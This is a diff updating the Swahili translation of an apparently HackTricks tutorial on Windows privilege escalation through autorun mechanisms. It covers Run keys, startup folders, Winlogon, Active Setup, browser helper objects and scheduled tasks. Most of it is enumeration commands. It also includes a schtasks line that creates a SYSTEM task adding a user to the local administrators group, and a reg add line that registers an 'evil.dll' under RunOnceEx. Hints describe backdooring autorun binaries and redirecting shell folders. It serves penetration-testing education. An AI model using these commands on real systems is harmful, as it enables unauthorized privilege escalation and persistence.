@@ -1,35 +1,36 @@
-# Kupandisha Mamlaka kwa Kutumia Autoruns
+# Privilege Escalation with Autoruns
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Mwongozo wa Tuzo ya Kosa la Programu**: **jiandikishe** kwa **Intigriti**, jukwaa la **tuzo za kosa la programu la premium lililoundwa na wadukuzi, kwa wadukuzi**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!
+**Bug bounty tip**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na uanze kupata zawadi hadi **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## WMIC
 
-**Wmic** inaweza kutumika kutekeleza programu kwenye **kuanza**. Angalia ni programu zipi zimepangwa kuanza kiotomatiki na:
+**Wmic** inaweza kutumika kuendesha programu kwenye **kuanzisha**. Angalia ni binaries gani zimepangwa kuendesha kwenye kuanzisha kwa:
 ```bash
 wmic startup get caption,command 2>nul & ^
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
-## Kazi Zilizopangwa
+## Scheduled Tasks
 
-**Kazi** zinaweza kupangwa kufanya kazi kwa **frekwensi fulani**. Angalia ni binaries zipi zimepangwa kufanya kazi na:
+**Kazi** zinaweza kuandaliwa kufanyika kwa **mara fulani**. Angalia ni binaries gani zimeandaliwa kufanyika na:
 ```bash
 schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 schtasks /query /fo LIST 2>nul | findstr TaskName
@@ -40,9 +41,9 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 #You can also write that content on a bat file that is being executed by a scheduled task
 schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
 ```
-## Vyeo
+## Folders
 
-Binari zote zilizoko kwenye **Vyeo vya Kuanza zitatekelezwa wakati wa kuanza**. Vyeo vya kuanza vya kawaida ni vile vilivyoorodheshwa hapa chini, lakini kigezo cha kuanza kinaonyeshwa kwenye usajili. [Soma hii kujua mahali.](privilege-escalation-with-autorun-binaries.md#startup-path)
+Mabinary yote yaliyoko katika **maktaba za Kuanzisha yataanzishwa wakati wa kuanzisha**. Maktaba za kawaida za kuanzisha ni zile zilizoorodheshwa hapa chini, lakini maktaba ya kuanzisha inaonyeshwa katika rejista. [Soma hii kujifunza wapi.](privilege-escalation-with-autorun-binaries.md#startup-path)
 ```bash
 dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
 dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
@@ -51,15 +52,15 @@ dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
 Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
 Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 ```
-## Usajili
+## Registry
 
 {% hint style="info" %}
-[Taarifa kutoka hapa](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Kuingia kwa usajili wa **Wow6432Node** inaonyesha kuwa unatumia toleo la Windows la biti 64. Mfumo wa uendeshaji hutumia funguo hii kuonyesha maoni tofauti ya HKEY\_LOCAL\_MACHINE\SOFTWARE kwa programu za biti 32 zinazoendesha kwenye toleo la Windows la biti 64.
+[Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Kichupo cha **Wow6432Node** kinadhihirisha kuwa unatumia toleo la Windows la 64-bit. Mfumo wa uendeshaji unatumia funguo hii kuonyesha mtazamo tofauti wa HKEY\_LOCAL\_MACHINE\SOFTWARE kwa programu za 32-bit zinazotumika kwenye toleo la Windows la 64-bit.
 {% endhint %}
 
-### Uendeshaji
+### Runs
 
-Usajili wa AutoRun unaojulikana kwa kawaida:
+**Inajulikana sana** AutoRun registry:
 
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
@@ -73,9 +74,9 @@ Usajili wa AutoRun unaojulikana kwa kawaida:
 * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
 * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`
 
-Funguo za usajili zinazojulikana kama **Run** na **RunOnce** zimeundwa kutekeleza programu moja kwa moja kila wakati mtumiaji anaingia kwenye mfumo. Mstari wa amri uliowekwa kama thamani ya data ya funguo ni mdogo hadi herufi 260 au chini.
+Funguo za registry zinazojulikana kama **Run** na **RunOnce** zimeundwa ili kutekeleza programu kiotomatiki kila wakati mtumiaji anapoingia kwenye mfumo. Mstari wa amri uliotolewa kama thamani ya data ya funguo umewekwa mipaka ya herufi 260 au chini.
 
-**Uendeshaji wa Huduma** (unaweza kudhibiti kuanza kiotomatiki kwa huduma wakati wa kuanza):
+**Huduma inazoendesha** (zinaweza kudhibiti kuanzishwa kiotomatiki kwa huduma wakati wa boot):
 
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
@@ -91,16 +92,16 @@ Funguo za usajili zinazojulikana kama **Run** na **RunOnce** zimeundwa kutekelez
 * `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
 * `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`
 
-Kwenye Windows Vista na toleo zilizofuata, funguo za usajili za **Run** na **RunOnce** hazijengwi kiotomatiki. Viingilio katika funguo hizi vinaweza kuanza programu moja kwa moja au kuzitaja kama tegemezi. Kwa mfano, ili kupakia faili ya DLL wakati wa kuingia, mtu anaweza kutumia funguo ya usajili ya **RunOnceEx** pamoja na funguo ya "Depend". Hii inadhihirishwa kwa kuongeza kuingilio cha usajili kutekeleza "C:\temp\evil.dll" wakati wa kuanza kwa mfumo:
+Katika Windows Vista na toleo la baadaye, funguo za registry za **Run** na **RunOnce** hazizalishwi kiotomatiki. Kuingizwa katika funguo hizi kunaweza kuanzisha programu moja kwa moja au kuzitaja kama utegemezi. Kwa mfano, ili kupakia faili ya DLL wakati wa kuingia, mtu anaweza kutumia funguo ya registry ya **RunOnceEx** pamoja na funguo ya "Depend". Hii inaonyeshwa kwa kuongeza kuingizwa kwa registry ili kutekeleza "C:\temp\evil.dll" wakati wa kuanzishwa kwa mfumo:
 ```
 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
 ```
 {% hint style="info" %}
-**Kutumia 1**: Ikiwa unaweza kuandika ndani ya usajili uliotajwa ndani ya **HKLM** unaweza kuinua mamlaka wakati mtumiaji tofauti anapoingia.
+**Exploit 1**: Ikiwa unaweza kuandika ndani ya yoyote ya rejista zilizotajwa ndani ya **HKLM** unaweza kuongeza mamlaka wakati mtumiaji tofauti anapoingia.
 {% endhint %}
 
 {% hint style="info" %}
-**Kutumia 2**: Ikiwa unaweza kubadilisha yaliyomo ya faili za binary zilizotajwa kwenye usajili wowote ndani ya **HKLM** unaweza kuhariri faili hiyo na mlango wa nyuma wakati mtumiaji tofauti anapoingia na kuinua mamlaka.
+**Exploit 2**: Ikiwa unaweza kufuta yoyote ya binaries zilizotajwa kwenye yoyote ya rejista ndani ya **HKLM** unaweza kubadilisha binary hiyo kwa backdoor wakati mtumiaji tofauti anapoingia na kuongeza mamlaka.
 {% endhint %}
 ```bash
 #CMD
@@ -157,17 +158,17 @@ Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\Ru
 Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
 Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
 ```
-### Njia ya Kuanza
+### Startup Path
 
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
 
-Vidakuzi vilivyowekwa kwenye folda ya **Startup** vitaanzisha huduma au programu kuanza wakati wa kuingia kwa mtumiaji au kuanza upya kwa mfumo. Mahali pa folda ya **Startup** imefafanuliwa kwenye usajili kwa ajili ya **Local Machine** na **Current User**. Hii inamaanisha kwamba kifupisho chochote kilichowekwa kwenye maeneo maalum ya **Startup** yatahakikisha huduma au programu iliyounganishwa inaanza baada ya mchakato wa kuingia au kuanza upya, hivyo kuwa njia rahisi ya kupanga programu zifanye kazi moja kwa moja.
+Viungo vilivyowekwa katika folda ya **Startup** vitasababisha huduma au programu kuanzishwa wakati wa kuingia kwa mtumiaji au upya wa mfumo. Mahali pa folda ya **Startup** lin defined katika rejista kwa ajili ya **Local Machine** na **Current User**. Hii inamaanisha kwamba kiungo chochote kilichoongezwa kwenye maeneo haya maalum ya **Startup** kitahakikisha huduma au programu iliyounganishwa inaanza baada ya mchakato wa kuingia au upya, na kufanya kuwa njia rahisi ya kupanga programu kuendesha kiotomatiki.
 
 {% hint style="info" %}
-Ikiwa unaweza kubadilisha folda yoyote ya \[User] Shell chini ya **HKLM**, utaweza kuiongoza kwenye folda inayodhibitiwa na wewe na kuweka mlango wa nyuma ambao utatekelezwa wakati wowote mtumiaji anapoingia kwenye mfumo na kukuza mamlaka.
+Ikiwa unaweza kubadilisha chochote \[User] Shell Folder chini ya **HKLM**, utaweza kuielekeza kwenye folda inayodhibitiwa na wewe na kuweka backdoor ambayo itatekelezwa wakati wowote mtumiaji anapoingia kwenye mfumo ikipandisha haki.
 {% endhint %}
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
@@ -180,11 +181,11 @@ Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
 ```
-### Funguo za Winlogon
+### Winlogon Keys
 
 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
 
-Kawaida, funguo ya **Userinit** imewekwa kwa **userinit.exe**. Hata hivyo, ikiwa funguo hii imebadilishwa, programu inayotajwa itazinduliwa pia na **Winlogon** baada ya mtumiaji kuingia. Vivyo hivyo, funguo ya **Shell** inalenga kuonyesha **explorer.exe**, ambayo ni shell ya msingi ya Windows.
+Kawaida, ufunguo wa **Userinit** umewekwa kwenye **userinit.exe**. Hata hivyo, ikiwa ufunguo huu umebadilishwa, executable iliyoainishwa pia itazinduliwa na **Winlogon** wakati wa kuingia kwa mtumiaji. Vivyo hivyo, ufunguo wa **Shell** unakusudia kuelekeza kwenye **explorer.exe**, ambayo ni shell ya kawaida kwa Windows.
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
@@ -192,10 +193,10 @@ Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVers
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
 ```
 {% hint style="info" %}
-Ikiwa unaweza kubadilisha thamani ya usajili au faili ya binary utaweza kuinua mamlaka.
+Ikiwa unaweza kubadilisha thamani ya rejista au binary, utaweza kuongeza mamlaka.
 {% endhint %}
 
-### Mipangilio ya Sera
+### Sera za Mipangilio
 
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
@@ -207,87 +208,87 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v 
 Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
 Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
 ```
-### Shell Mbunifu
+### AlternateShell
 
-### Kubadilisha Amri Salama ya Mfumo wa Kuingia
+### Kubadilisha Amri ya Salama ya Msimbo
 
-Katika Usajili wa Windows chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** iliyo wekwa kwa chaguo la msingi la `cmd.exe`. Hii inamaanisha unapochagua "Safe Mode with Command Prompt" wakati wa kuanza (kwa kubonyeza F8), `cmd.exe` hutumika. Lakini, niwezekano wa kuweka kompyuta yako kuanza moja kwa moja katika hali hii bila kuhitaji kubonyeza F8 na kuchagua kwa mkono.
+Katika Usajili wa Windows chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** iliyowekwa kwa chaguo-msingi kuwa `cmd.exe`. Hii inamaanisha wakati unachagua "Salama Msimbo na Amri" wakati wa kuanzisha (kwa kubonyeza F8), `cmd.exe` inatumika. Lakini, inawezekana kuandaa kompyuta yako kuanza moja kwa moja katika hali hii bila kuhitaji kubonyeza F8 na kuchagua kwa mikono.
 
-Hatua za kuunda chaguo la kuanza moja kwa moja katika "Safe Mode with Command Prompt":
+Hatua za kuunda chaguo la kuanzisha ili kuanza moja kwa moja katika "Salama Msimbo na Amri":
 
-1. Badilisha sifa za faili ya `boot.ini` ili kuondoa alama za kusoma tu, mfumo, na siri: `attrib c:\boot.ini -r -s -h`
-2. Fungua `boot.ini` kwa kuhariri.
-3. Ingiza mstari kama huu: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
+1. Badilisha sifa za faili ya `boot.ini` kuondoa bendera za kusoma pekee, mfumo, na zilizofichwa: `attrib c:\boot.ini -r -s -h`
+2. Fungua `boot.ini` kwa ajili ya kuhariri.
+3. Ingiza mstari kama: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
 4. Hifadhi mabadiliko kwenye `boot.ini`.
-5. Rejesha sifa za faili ya awali: `attrib c:\boot.ini +r +s +h`
+5. Rudisha sifa za awali za faili: `attrib c:\boot.ini +r +s +h`
 
-* **Kutumia 1:** Kubadilisha ufunguo wa usajili wa **AlternateShell** inaruhusu usanidi wa kabati ya amri ya desturi, labda kwa ufikiaji usioruhusiwa.
-* **Kutumia 2 (Ruhusa za Kuandika PATH):** Kuwa na ruhusa za kuandika sehemu yoyote ya mchanganyiko wa mfumo wa **PATH**, hasa kabla ya `C:\Windows\system32`, inakuruhusu kutekeleza `cmd.exe` ya desturi, ambayo inaweza kuwa mlango wa nyuma ikiwa mfumo unaanza katika Safe Mode.
-* **Kutumia 3 (Ruhusa za Kuandika PATH na boot.ini):** Ruhusa ya kuandika kwa `boot.ini` inawezesha kuanza moja kwa moja katika Safe Mode, ikirahisisha ufikiaji usioruhusiwa wakati wa kuanza upya ijayo.
+* **Exploit 1:** Kubadilisha funguo za usajili **AlternateShell** kunaruhusu usanidi wa shell ya amri ya kawaida, huenda kwa ufikiaji usioidhinishwa.
+* **Exploit 2 (Ruhusa za Kuandika PATH):** Kuwa na ruhusa za kuandika sehemu yoyote ya mfumo wa **PATH** variable, hasa kabla ya `C:\Windows\system32`, kunakuwezesha kutekeleza `cmd.exe` ya kawaida, ambayo inaweza kuwa nyuma ya mlango ikiwa mfumo utaanzishwa katika Hali ya Salama.
+* **Exploit 3 (Ruhusa za Kuandika PATH na boot.ini):** Upatikanaji wa kuandika kwenye `boot.ini` unaruhusu kuanzisha Hali ya Salama kiotomatiki, ikirahisisha ufikiaji usioidhinishwa kwenye kuanzisha kwa pili.
 
-Ili kuchunguza mipangilio ya sasa ya **AlternateShell**, tumia amri hizi:
+Ili kuangalia mipangilio ya sasa ya **AlternateShell**, tumia amri hizi:
 ```bash
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
 ```
-### Kipengele Kilichosakinishwa
+### Installed Component
 
-Active Setup ni kipengele katika Windows ambacho **kinazinduliwa kabla ya mazingira ya desktop kumalizika kupakia**. Kinapewa kipaumbele katika utekelezaji wa amri fulani, ambazo lazima zikamilike kabla ya mchakato wa kuingia kwa mtumiaji kuendelea. Mchakato huu unatokea hata kabla ya vipengele vingine vya kuanza, kama vile vile katika sehemu za usajili za Run au RunOnce, kuanza.
+Active Setup ni kipengele katika Windows ambacho **kinanzishwa kabla ya mazingira ya desktop kupakiwa kikamilifu**. Kinatoa kipaumbele kwa utekelezaji wa amri fulani, ambazo lazima zikamilike kabla ya kuendelea na kuingia kwa mtumiaji. Mchakato huu unafanyika hata kabla ya kuanzishwa kwa entries zingine za kuanzisha, kama zile katika sehemu za Run au RunOnce za rejista.
 
-Active Setup inasimamiwa kupitia funguo za usajili zifuatazo:
+Active Setup inasimamiwa kupitia funguo za rejista zifuatazo:
 
 * `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
 * `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
 * `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
 * `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
 
-Ndani ya funguo hizi, kuna funguo mbalimbali, kila moja ikilingana na kipengele maalum. Thamani muhimu za funguo ni pamoja na:
+Ndani ya funguo hizi, kuna funguo ndogo mbalimbali, kila moja ikihusiana na kipengele maalum. Thamani za funguo zinazovutia hasa ni pamoja na:
 
 * **IsInstalled:**
-  * `0` inaonyesha kwamba amri ya kipengele haitatekelezwa.
-  * `1` inamaanisha kwamba amri itatekelezwa mara moja kwa kila mtumiaji, ambayo ni tabia ya msingi ikiwa thamani ya `IsInstalled` haipo.
-* **StubPath:** Inaainisha amri itakayotekelezwa na Active Setup. Inaweza kuwa amri yoyote halali ya mstari wa amri, kama vile kuzindua `notepad`.
+* `0` inaonyesha amri ya kipengele haitatekelezwa.
+* `1` inamaanisha amri itatekelezwa mara moja kwa kila mtumiaji, ambayo ni tabia ya kawaida ikiwa thamani ya `IsInstalled` haipo.
+* **StubPath:** Mwelekeo wa amri itakayotekelezwa na Active Setup. Inaweza kuwa amri yoyote halali ya mstari, kama kuanzisha `notepad`.
 
-**Machapisho ya Usalama:**
+**Uelewa wa Usalama:**
 
-* Kubadilisha au kuandika kwenye funguo ambapo **`IsInstalled`** imewekwa kuwa `"1"` na **`StubPath`** maalum inaweza kusababisha utekelezaji wa amri usioruhusiwa, labda kwa ajili ya kuinua mamlaka.
-* Kubadilisha faili ya binary inayotajwa katika thamani yoyote ya **`StubPath`** pia inaweza kufanikisha kuinua mamlaka, ikitoa idhini za kutosha.
+* Kubadilisha au kuandika kwenye funguo ambapo **`IsInstalled`** imewekwa kuwa `"1"` na **`StubPath`** maalum kunaweza kusababisha utekelezaji wa amri zisizoidhinishwa, huenda kwa ajili ya kupandisha hadhi.
+* Kubadilisha faili ya binary inayorejelewa katika thamani yoyote ya **`StubPath`** pia kunaweza kufanikisha kupandisha hadhi, ikiwa na ruhusa za kutosha.
 
-Ili kukagua mipangilio ya **`StubPath`** kote kwenye vipengele vya Active Setup, amri hizi zinaweza kutumika:
+Ili kukagua mipangilio ya **`StubPath`** katika vipengele vya Active Setup, amri hizi zinaweza kutumika:
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
 reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
 reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
 reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
 ```
-### Vitu Visaidizi vya Kivinjari
+### Browser Helper Objects
 
-### Muhtasari wa Vitu Visaidizi vya Kivinjari (BHOs)
+### Overview of Browser Helper Objects (BHOs)
 
-Vitu Visaidizi vya Kivinjari (BHOs) ni moduli za DLL ambazo huongeza vipengele ziada kwa Internet Explorer ya Microsoft. Hizi hulipia katika Internet Explorer na Windows Explorer kila kuanza. Hata hivyo, utekelezaji wao unaweza kuzuiliwa kwa kuweka funguo ya **NoExplorer** kuwa 1, ikizuia kuzipakia na mifano ya Windows Explorer.
+Browser Helper Objects (BHOs) ni moduli za DLL ambazo zinaongeza vipengele vya ziada kwa Internet Explorer ya Microsoft. Zinapakia kwenye Internet Explorer na Windows Explorer kila wakati zinapoanzishwa. Hata hivyo, utekelezaji wao unaweza kuzuiwa kwa kuweka ufunguo wa **NoExplorer** kuwa 1, kuzuia kutoka kupakia na mifano ya Windows Explorer.
 
-BHOs ni sawa na Windows 10 kupitia Internet Explorer 11 lakini hazisaidiwi katika Microsoft Edge, kivinjari cha msingi katika toleo jipya la Windows.
+BHOs zinaendana na Windows 10 kupitia Internet Explorer 11 lakini hazipati msaada katika Microsoft Edge, kivinjari cha chaguo-msingi katika toleo jipya la Windows.
 
-Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua funguo za usajili zifuatazo:
+Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua ufunguo wa rejista zifuatazo:
 
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
 * `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
 
-Kila BHO inawakilishwa na **CLSID** yake kwenye usajili, ikifanya kama kitambulisho cha kipekee. Maelezo ya kina kuhusu kila CLSID yanaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.
+Kila BHO inawakilishwa na **CLSID** yake katika rejista, ikihudumu kama kitambulisho cha kipekee. Taarifa za kina kuhusu kila CLSID zinaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.
 
-Kwa kuuliza BHOs kwenye usajili, amri hizi zinaweza kutumika:
+Kwa kuuliza BHOs katika rejista, amri hizi zinaweza kutumika:
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 ```
-### Vifaa vya Kivinjari cha Internet Explorer
+### Internet Explorer Extensions
 
 * `HKLM\Software\Microsoft\Internet Explorer\Extensions`
 * `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`
 
-Tafadhali kumbuka kuwa usajili utaleta usajili mpya kwa kila dll na itawakilishwa na **CLSID**. Unaweza kupata habari ya CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`
+Kumbuka kwamba rejista itakuwa na rejista 1 mpya kwa kila dll na itawakilishwa na **CLSID**. Unaweza kupata taarifa za CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`
 
-### Madereva ya Fonti
+### Font Drivers
 
 * `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
 * `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
@@ -297,7 +298,7 @@ reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Dr
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
 ```
-### Amri ya Kufungua
+### Open Command
 
 * `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
 * `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
@@ -307,22 +308,22 @@ reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
 ```
-### Chaguo la Utekelezaji wa Faili ya Picha
+### Chaguzi za Utekelezaji wa Faili za Picha
 ```
 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
 HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
 ```
 ## SysInternals
 
-Tafadhali kumbuka kuwa tovuti zote ambapo unaweza kupata autoruns tayari **zimeshatafutwa na** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Walakini, kwa orodha **kina zaidi ya faili zinazoendeshwa moja kwa moja** unaweza kutumia [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kutoka kwa SysInternals:
+Kumbuka kwamba tovuti zote ambapo unaweza kupata autoruns **zimeshachunguzwa na** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Hata hivyo, kwa **orodha kamili zaidi ya** faili zinazotekelezwa kiotomatiki unaweza kutumia [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kutoka sysinternals:
 ```
 autorunsc.exe -m -nobanner -a * -ct /accepteula
 ```
-## Zaidi
+## More
 
-**Pata Autoruns zaidi kama registries katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
+**Pata zaidi ya Autoruns kama vile registries katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
 
-## Marejeo
+## References
 
 * [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
 * [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
@@ -331,20 +332,21 @@ autorunsc.exe -m -nobanner -a * -ct /accepteula
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
